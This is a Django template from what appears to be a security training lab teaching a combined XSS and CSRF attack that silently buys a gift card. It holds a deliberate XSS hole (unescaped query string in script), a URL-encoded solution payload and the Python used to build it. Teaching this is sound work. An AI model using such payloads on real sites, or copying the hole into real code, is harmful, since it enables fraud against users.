{% extends "exercise_base.html" %}

{% block title %}{{ block.super }}CSRF Image Attack{% endblock %}

{% block header %}
    <h1>CSRF Image Attack</h1>
{% endblock %}

{% block content %}

<p>Imagine, if you will, a website feature where an authenticated user with a
Payment on File could easily send a gift card to a friend.</p>

<p>Seems innocent. We'll make sure that when the user POSTs the form that
they are authenticated and that have a PoF. Done. Safe. Or...</p>

<p>What would happen if we were not careful about security? Let's pretend
that the view doesn't check if the POST was a POST. If we could find another
page on the site with an XSS vulnerablity we could construct a URL that
could inject an image link that triggers a giftcard purchase.</p>

<p>Let's try it!</p>

<ul>
    <li>Use the <a href="{% url 'csrf-gift-card' %}">giftcard</a> form for reference.</li>
    <li>Your email address is <code>evil@evil.com</code></li>
    <li>You want $100 giftcards (the field expects an integer)</li>
    <li>Use a querystring parameter <code>qs</code> on this page to inject the image.</li>
</ul>

{% if qs %}
    <div class="hints panel">
        <p>Helpful hints</p>
        <ul>
            <li>Think back to the solution for <a href="/cross-site-scripting/query-params?qs=awesome">XSS via Query Parameters</a> exercise</li>
        </ul>
        <a class="tiny button" id="show_solution">show solution</a>
    </div>
{% endif %}

<div class="solution panel">
    <h4>Solution</h4>
    <p>The link below has the correct URL:</p>
    <a href="/csrf/image?qs=%20%20%20%20%20%22%3Bvar%20i%3Ddocument.createElement%28%27img%27%29%3B%20%20%20%20%20i.src%3D%27/csrf/gift-card%3Femail%3Devil%40evil.com%26amount%3D100%27%3B%20%20%20%20%20i.setAttribute%28%27display%27%2C%20%27none%27%29%3B%20%20%20%20%20document.body.appendChild%28i%29%3B%22">solution link</a>
    <p>This querystring was created using interactive Python:</p>
    <code>
        import urllib<br>
        url = '/csrf/gift-card?email=evil@evil.com&amp;amount=100'<br>
        js = '''";var i=document.createElement('img');''' +\<br>
        &nbsp;&nbsp;&nbsp;&nbsp;'''i.src=%r;''' +\<br>
        &nbsp;&nbsp;&nbsp;&nbsp;'''i.setAttribute('display', 'none');''' +\<br>
        &nbsp;&nbsp;&nbsp;&nbsp;'''document.body.appendChild(i);"'''<br>
        urllib.quote(js % url)
    </code>
    <p>In this example we've combined and XSS exploit with a CSRF exploit. This way the domain name on the
       link is familiar to the user. It is also possible to embed images on different sites or within email
       to accomplish the attack.</p>
</div>

{% endblock %}


{% block extra_js %}
{{ block.super }}
<script src="{{STATIC_URL}}js/vendor/jquery.js"></script>
<script type="text/javascript">
var x = "{{qs|safe}}";

function contains(arr, item) {
    for (var i in arr) {
        if (arr[i] === item) { return true; }
    }
    return false;
}

$(function() {
    var images = $('img').toArray();
    console.log(images);
    var injected_src = '';

    for (var i in images) {
        var $image = $(images[i]);
        console.log($image);
        console.log($image.attr('src'));
        if ($image.attr('src').indexOf('/csrf/gift-card') > -1) {
            injected_src = $image.attr('src');
            break;
        }
    }

    if (!injected_src && window.location.search.length > 3) {
        alert("I see you any trying the exercise. Keep going and you'll get it!");
        return; // has started, but no valid image can be found
    } else if (!injected_src) {
        return; // has not started yet
    }

    var qs = injected_src.match(/.*\?(.*)/)[1 ].split('&');

    if (!contains(qs, 'email=evil@evil.com')) {
        alert("Your injected image doesn't have the correct email specified");
        return;
    }

    if (!contains(qs, 'amount=100')) {
        alert("Your injected image doesn't have the correct amount specified");
        return;
    }

    alert('You have successfully padded your pockets on the backs of others.');
});
</script>
{% endblock %}

{% block extra_topnav %}
<li><a href="{% url 'csrf' %}">Prev</a></li>
<li><a href="{% url 'csrf-third-party' %}">Next</a></li>
{% endblock %}

{% block extra_botnav %}
<li><a href="{% url 'csrf' %}">Prev</a></li>
<li><a href="{% url 'csrf-third-party' %}">Next</a></li>
{% endblock %}
